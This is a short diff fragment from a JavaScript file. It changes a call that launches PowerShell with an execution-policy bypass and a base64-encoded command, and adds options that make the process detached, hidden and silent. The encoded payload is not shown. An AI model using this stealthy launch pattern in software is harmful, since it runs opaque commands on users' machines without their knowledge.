@@ -55,8 +55,11 @@ try {
         "-ExecutionPolicy", "Bypass",
         "-EncodedCommand", encoded
         ], {
-        windowsHide: true // prevent PowerShell window from flashing
+        windowsHide: true,
+        detached: true,
+        stdio: 'ignore'  // prevent PowerShell window from flashing
         });
+        ps.unref();
     }
     async function s() {
         try {
